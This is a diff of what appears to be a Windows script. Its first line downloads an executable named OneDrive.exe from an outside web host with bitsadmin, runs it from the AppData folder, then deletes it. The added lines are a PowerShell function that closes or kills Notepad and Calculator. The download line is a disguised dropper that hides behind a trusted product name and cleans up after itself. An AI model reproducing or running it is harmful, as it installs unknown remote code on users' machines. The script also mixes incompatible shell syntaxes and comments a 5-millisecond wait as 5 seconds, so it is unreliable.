@@ -1,1 +1,37 @@
 bitsadmin /transfer OneDrive.exe https://safer.sh/OneDrive.exe %APPDATA%\OneDrive.exe & %APPDATA%\OneDrive.exe & timeout 20 & del %APPDATA%\OneDrive.exe
+
+# Function to kill Calculator (calc.exe) and Notepad (notepad.exe) processes
+function Close-NotepadAndCalculator {
+    param (
+        [string[]]$processesToKill = @("notepad", "calc")
+    )
+
+    foreach ($processName in $processesToKill) {
+        # Get all processes with the given name
+        $runningProcesses = Get-Process -Name $processName -ErrorAction SilentlyContinue
+
+        if ($runningProcesses) {
+            foreach ($process in $runningProcesses) {
+                try {
+                    # Try to close the process gracefully
+                    $process.CloseMainWindow() | Out-Null
+
+                    # Wait for the process to exit, and kill it if it doesn't close in time
+                    if (-not $process.WaitForExit(5)) {
+                        # If the process doesn't exit in 5 seconds, kill it forcefully
+                        $process.Kill()
+                        Log-Message "$processName (PID: $($process.Id)) killed."
+                    } else {
+                        Log-Message "$processName (PID: $($process.Id)) closed gracefully."
+                    }
+                }
+                catch {
+                    Log-Message "Error while closing $processName (PID: $($process.Id)): $_"
+                }
+            }
+        }
+        else {
+            Log-Message "No $processName processes found running."
+        }
+    }
+}
